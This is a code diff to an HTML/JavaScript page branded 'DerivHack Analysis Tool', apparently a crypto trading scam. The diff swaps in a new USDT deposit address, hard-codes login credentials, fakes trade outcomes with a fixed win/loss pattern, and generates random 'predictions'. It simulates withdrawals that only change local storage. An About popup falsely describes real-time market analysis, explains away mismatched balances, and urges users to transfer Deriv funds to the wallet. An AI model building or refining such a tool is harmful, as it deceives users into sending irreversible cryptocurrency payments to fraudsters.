@@ -650,9 +650,11 @@ Invalid credentials or Terms not accepted
 <div class="side-card">
 
 <h3>Deposit</h3>
-
+<div>Send USDT (TRC20) only to this address.</div>
+</div>
+</div>
 <p style="word-break:break-all">
-TJ3xrDQSrvY4k6tSSxz9rkNArL1YsqgmrC
+TN8U84KT4378GGdPwTAtVjQeaGwQszDCry
 </p>
 
 <button class="side-btn copy-btn" id="copyBtn">
@@ -690,6 +692,7 @@ function withdraw(){
 <div class="side-card">
 
 <h3>Portfolio</h3>
+<div>Withdrawal records</div>
 
 <div id="withdrawHistory">
 No withdrawals yet
@@ -704,6 +707,13 @@ No withdrawals yet
 <button class="side-btn support-btn"
 onclick="window.open('https://wa.me/254740491902','_blank')">
 Contact Support
+</button>
+
+</div>
+
+<button class="side-btn support-btn"
+id="aboutBtn">
+About Tool
 </button>
 
 </div>
@@ -724,12 +734,22 @@ Logout
 </div>
 
 <div class="nav-right">
-
+<button id="muteBtn" style="
+padding:8px 12px;
+border:none;
+border-radius:10px;
+cursor:pointer;
+background:#2b3555;
+color:white;
+font-weight:bold;
+">
+🔊 MUTE
+</button>
 <div class="balance-box">
 <img src="https://flagcdn.com/us.svg" 
      style="width:20px;height:20px;border-radius:50%;object-fit:cover;">
 <span id="accountType">REAL</span>
-<strong id="balance">$10.00</strong>
+<strong id="balance">$0.00</strong>
 </div>
 
 <div class="toggle">
@@ -901,12 +921,14 @@ particles.appendChild(span);
 ========================================================= */
 
 let realBalance =
-Number(localStorage.getItem("realBalance")) || 10.00;
+Number(localStorage.getItem("realBalance")) || 0.00;
 
 let demoBalance =
 Number(localStorage.getItem("demoBalance")) || 10000;
 
 let currentAccount = "REAL";
+
+let isMuted = false;
 
 function saveBalances(){
 
@@ -991,11 +1013,36 @@ document.getElementById("password").value;
 const terms =
 document.getElementById("terms").checked;
 
-if(
-user==="User261" &&
-pass==="Alfa@721" &&
-terms
-){
+const accounts = [
+
+{
+username:"User271",
+password:".Deck@/"
+},
+
+{
+username:"User281",
+password:".Pass.@1"
+},
+
+{
+username:"User301",
+password:".Blend@,/"
+},
+
+{
+username:"User298",
+password:"First@,/"
+}
+
+];
+
+const validUser = accounts.find(account =>
+account.username === user &&
+account.password === pass
+);
+
+if(validUser && terms){
 
 localStorage.setItem(
 "qvap_session",
@@ -1107,6 +1154,17 @@ updateBalanceUI();
 
 };
 
+document.getElementById("muteBtn").onclick = () => {
+
+isMuted = !isMuted;
+
+document.getElementById("muteBtn").innerText =
+isMuted ? "🔇 UNMUTE" : "🔊 MUTE";
+
+toast(isMuted ? "Voice muted" : "Voice enabled");
+
+};
+
 /* =========================================================
    VOLATILITY TABS
 ========================================================= */
@@ -1163,7 +1221,12 @@ currentVolatility = vol;
 document.getElementById("currentVol")
 .innerText = vol;
 
-generateDigits();
+/* NEW UNIQUE DIGITS FOR THIS VOLATILITY */
+
+digitPercentages =
+createVolatilityDigits();
+
+renderDigits();
 
 };
 
@@ -1178,9 +1241,31 @@ tabs.appendChild(tab);
 const digitGrid =
 document.getElementById("digitGrid");
 
-let digitPercentages = [
-12,10,8,14,7,9,13,6,11,10
-];
+let digitPercentages = [];
+
+function createVolatilityDigits(){
+
+let values = [];
+
+for(let i=0;i<10;i++){
+
+values.push(
+Math.random()*15 + 4
+);
+
+}
+
+let total =
+values.reduce((a,b)=>a+b,0);
+
+return values.map(v=>
+(v/total)*100
+);
+
+}
+
+digitPercentages =
+createVolatilityDigits();
 
 function updatePercentages(){
 
@@ -1316,14 +1401,28 @@ btn.innerText=
 "ANALYZE MARKET";
 
 toast("Prediction generated");
+/* SPEECH ANNOUNCEMENT */
 
+const msg = new SpeechSynthesisUtterance(
+"Prediction generated. The predicted digit is " + prediction
+);
+
+msg.rate = 1;
+msg.pitch = 1;
+msg.volume = 1;
+
+if(!isMuted){
+window.speechSynthesis.speak(msg);
+}
 },5000);
 
 };
 
 /* =========================================================
    BOT LOGIC
-   2 WINS THEN 1 LOSS
+   PATTERN:
+   WIN, WIN, LOSS,
+   WIN, WIN, LOSS, LOSS
 ========================================================= */
 
 let tradeCycle =
@@ -1364,6 +1463,51 @@ return;
 
 }
 
+/* MINIMUM STAKE */
+
+if(stake < 0.35){
+
+toast("Minimum stake is $0.35");
+
+return;
+
+}
+
+/* STAKE MUST NOT EXCEED ACCOUNT BALANCE */
+
+const accountBalance =
+currentAccount === "REAL"
+? realBalance
+: demoBalance;
+
+if(stake > accountBalance){
+
+toast("Invalid Stake");
+
+return;
+
+}
+
+/* BLOCK REAL ACCOUNT TRADING IF BALANCE IS ZERO */
+
+if(currentAccount === "REAL" && realBalance <= 0){
+
+toast("Insufficient Balance.");
+
+document.getElementById("botStatus")
+.innerHTML=`
+<span style="
+color:var(--red);
+font-weight:bold
+">
+REAL ACCOUNT BALANCE IS $0.00
+</span>
+`;
+
+return;
+
+}
+
 /* BLOCK REAL ACCOUNT TRADING IF BALANCE IS ZERO */
 
 if(currentAccount === "REAL" && realBalance <= 0){
@@ -1399,10 +1543,26 @@ localStorage.setItem(
 tradeCycle
 );
 
-/* 2 WINS THEN 1 LOSS */
+/* PATTERN:
+   WIN, WIN, LOSS,
+   WIN, WIN, LOSS, LOSS
+*/
+
+const pattern = [
+"WIN",
+"WIN",
+"LOSS",
+"WIN",
+"WIN",
+"LOSS",
+"LOSS"
+];
+
+const currentStep =
+pattern[(tradeCycle - 1) % pattern.length];
 
 const isLoss =
-tradeCycle % 3 === 0;
+currentStep === "LOSS";
 
 let resultText = "";
 let resultClass = "";
@@ -1439,7 +1599,7 @@ toast("Trade lost: -$" + amount);
 
 }else{
 
-amount = stake * 6;
+amount = Number((stake * 6.7).toFixed(2));
 
 if(currentAccount==="REAL"){
 
@@ -1488,7 +1648,7 @@ ${prediction}
 </td>
 
 <td>
-$${stake}
+$${Number(stake).toFixed(2)}
 </td>
 
 <td class="${resultClass}">
@@ -1531,71 +1691,157 @@ toast("TRC20 address copied");
 };
 
 /* =========================================================
+   WITHDRAWAL STORAGE SYSTEM
+========================================================= */
+
+let withdrawals =
+JSON.parse(localStorage.getItem("withdrawals")) || [];
+
+function saveWithdrawals(){
+localStorage.setItem("withdrawals", JSON.stringify(withdrawals));
+}
+
+function renderWithdrawals(){
+
+const history =
+document.getElementById("withdrawHistory");
+
+history.innerHTML = "";
+
+if(withdrawals.length === 0){
+history.innerHTML = "No withdrawals yet";
+return;
+}
+
+withdrawals.forEach((w, index) => {
+
+const item = document.createElement("div");
+
+item.style.marginTop = "10px";
+item.style.cursor = "pointer";
+
+item.innerHTML = `
+<div style="
+background:#0c1327;
+padding:12px;
+border-radius:12px;
+border-left:4px solid ${w.status === "success" ? "#00ff9d" : "#ffd93d"};
+">
+
+<!-- COLLAPSED VIEW -->
+<div style="display:flex;justify-content:space-between;align-items:center;">
+<strong>$${w.amount}</strong>
+<small>${w.status.toUpperCase()}</small>
+</div>
+
+<!-- EXPANDABLE CONTENT -->
+<div class="withdraw-details" style="
+max-height:0;
+overflow:hidden;
+transition:0.3s;
+margin-top:0;
+color:#9ca7c7;
+font-size:13px;
+">
+
+
+<div>Date: ${w.date || "N/A"}</div>
+<div>Time: ${w.time || "N/A"}</div>
+
+</div>
+
+</div>
+`;
+
+item.onclick = () => {
+
+const details =
+item.querySelector(".withdraw-details");
+
+if(details.style.maxHeight === "0px" || !details.style.maxHeight){
+details.style.maxHeight = "100px";
+details.style.marginTop = "10px";
+}else{
+details.style.maxHeight = "0px";
+details.style.marginTop = "0px";
+}
+
+};
+
+history.appendChild(item);
+
+});
+
+}
+
+/* =========================================================
    WITHDRAW
 ========================================================= */
 
-document.getElementById("withdrawBtn")
-.onclick=()=>{
+document.getElementById("withdrawBtn").onclick=()=>{
 
 const wallet =
-document.getElementById(
-"walletAddress"
-).value;
+document.getElementById("walletAddress").value;
 
 const amount =
-Number(document.getElementById(
-"withdrawAmount"
-).value);
+Number(document.getElementById("withdrawAmount").value);
 
 if(!wallet || !amount){
-
 toast("Fill all withdrawal fields");
-
 return;
-
 }
 
-/* WITHDRAWALS CAN ONLY COME FROM REAL ACCOUNT */
-
+/* check balance */
 if(amount > realBalance){
-
-toast("Insufficient balance");
-
+toast("Insufficient account balance");
 return;
-
 }
 
-/* DEDUCT WITHDRAWN FUNDS */
+/* CREATE PENDING WITHDRAWAL */
+const withdrawal = {
 
+id: Date.now(),
+
+wallet: wallet,
+
+amount: amount,
+
+status: "pending",
+
+createdAt: Date.now(),
+
+date: new Date().toLocaleDateString(),
+
+time: new Date().toLocaleTimeString()
+
+};
+withdrawals.push(withdrawal);
+saveWithdrawals();
+renderWithdrawals();
+
+toast("Withdrawal submitted (pending 5 mins)");
+
+/* PROCESS AFTER 5 MINUTES */
+setTimeout(()=>{
+
+let w = withdrawals.find(x => x.id === withdrawal.id);
+
+if(!w) return;
+
+w.status = "success";
+
+/* deduct only when successful */
 realBalance -= amount;
 
 saveBalances();
 updateBalanceUI();
 
-const history =
-document.getElementById(
-"withdrawHistory"
-);
+saveWithdrawals();
+renderWithdrawals();
 
-const item =
-document.createElement("div");
+toast("Withdrawal completed: $" + amount);
 
-item.style.marginTop="10px";
-
-item.innerHTML=`
-<div style="
-background:#0c1327;
-padding:12px;
-border-radius:12px;
-">
-<strong>$${amount}</strong><br>
-<small>PENDING</small>
-</div>
-`;
-
-history.prepend(item);
-
-toast("Withdrawal request pending");
+}, 300000); // 5 minutes
 
 };
 
@@ -1614,6 +1860,8 @@ new Date().toLocaleString();
 updateClock();
 
 setInterval(updateClock,1000);
+
+renderWithdrawals();
 
 /* =========================================================
    TOAST
@@ -1636,6 +1884,20 @@ toast.classList.remove("show");
 
 }
 
+document.getElementById("aboutBtn").onclick = () => {
+
+document.getElementById("aboutModal").style.display = "flex";
+
+};
+document.addEventListener("DOMContentLoaded", () => {
+
+document.getElementById("closeAbout").onclick = () => {
+
+document.getElementById("aboutModal").style.display = "none";
+
+};
+
+});
 /* =========================================================
    LOGOUT
 ========================================================= */
@@ -1653,5 +1915,124 @@ location.reload();
 
 </script>
 
+<!-- ABOUT POPUP START -->
+<div id="aboutModal" style="
+position:fixed;
+top:0;
+left:0;
+width:100%;
+height:100%;
+background:rgba(0,0,0,0.7);
+display:none;
+justify-content:center;
+align-items:center;
+z-index:99999;
+">
+
+<div style="
+background:#151d35;
+padding:25px;
+border-radius:18px;
+max-width:500px;
+width:90%;
+max-height:80vh;
+overflow-y:auto;
+color:white;
+text-align:left;
+">
+
+<h2>About This Tool</h2>
+
+<p style="margin-top:10px; line-height:1.5; color:#9ca7c7;">
+
+<h1>DerivHack Analysis Tool – User Guide & Important Information</h1>
+
+<h2>About the Tool</h2>
+<p>
+The DerivHack Analysis Tool is an advanced market-analysis platform designed to monitor and analyze synthetic index digit sequences. Using proprietary analytical models and real-time market data acquisition methods, the system evaluates historical and current digit-generation patterns to identify potential probability-based outcomes for upcoming market movements.
+</p>
+
+<p>
+The tool is intended to assist traders in making informed decisions by providing analytical insights and predictive indications based on observed market behavior. However, all outputs are probabilistic in nature and should not be interpreted as guaranteed results.
+</p>
+
+<h2>System Architecture</h2>
+<p>
+To maintain platform stability, reliability, and long-term availability, the DerivHack Analysis Tool does not require users to directly connect personal API tokens to the system. This design approach helps reduce the risk of service interruptions that can sometimes occur when external platforms flag or restrict heavily automated API activity.
+</p>
+
+<p>
+As a result, account information displayed within the tool may differ from what users see on their personal trading platform. This is a normal part of the system's architecture and is intended to preserve the operational integrity of the analysis environment.
+</p>
+
+<h2>Privacy & Platform Protection</h2>
+<p>
+The analytical infrastructure behind the tool represents significant research and development efforts. To help maintain uninterrupted service for all users, we strongly advise against publicly sharing private access links, internal system details, or platform-specific operational methods on social media, forums, or public groups.
+</p>
+
+<p>
+Unauthorized distribution may compromise platform stability and could affect future service availability.
+</p>
+
+<h2>Deposits & Withdrawals</h2>
+<p>
+All deposits and withdrawals within the tool are processed exclusively through USDT (TRC20).
+</p>
+
+<p>
+Each user is assigned a unique wallet address within the platform. This address serves as the designated funding address for that specific account.
+</p>
+
+<h3>Recommended Funding Method</h3>
+<p>
+For faster transaction processing, users are encouraged to utilize reputable cryptocurrency exchanges or wallets such as Binance, Bybit, Bitget, Trust Wallet, and other TRC20-compatible cryptocurrency wallets.
+</p>
+
+<p>
+Please note that transaction processing times may vary depending on blockchain network conditions and exchange verification procedures.
+</p>
+
+<h3>Funding from a Deriv Account</h3>
+<p>
+If your funds are currently held within your Deriv account, transfer the desired amount to your USDT wallet within Deriv, initiate a cryptocurrency withdrawal, select USDT (TRC20) as the withdrawal network, copy your assigned wallet address from the DerivHack Analysis Tool, carefully verify the address before confirming the withdrawal, and submit the withdrawal request.
+</p>
+
+<p>
+In most cases, funds will arrive within a few minutes, although actual processing times may vary depending on network conditions and third-party processing systems.
+</p>
+
+<h2>Important Notes</h2>
+<p>
+Only USDT (TRC20) deposits and withdrawals are supported. Always verify wallet addresses before sending funds. Cryptocurrency transactions cannot be reversed once confirmed on the blockchain. Trading involves financial risk, and past analytical performance does not guarantee future results. Users should trade responsibly and apply appropriate risk-management strategies at all times.
+</p>
+
+<h2>Risk Disclaimer</h2>
+<p>
+The DerivHack Analysis Tool is an analytical assistance platform and does not provide financial advice. Market predictions are generated using statistical and algorithmic analysis techniques and should be considered informational only. Users remain fully responsible for their trading decisions, risk exposure, and account management.
+</p>
+
+<p>
+By using this platform, you acknowledge that trading synthetic indices involves risk and that no analysis tool can guarantee profitable outcomes under all market conditions.
+</p>
+
+<button id="closeAbout" style="
+margin-top:15px;
+padding:10px 15px;
+border:none;
+border-radius:10px;
+background:#ff444f;
+color:white;
+cursor:pointer;
+font-weight:bold;
+">
+Close
+</button>
+
+</div>
+
+</div>
+
+</body>
+</html>
 </body>
 </html>
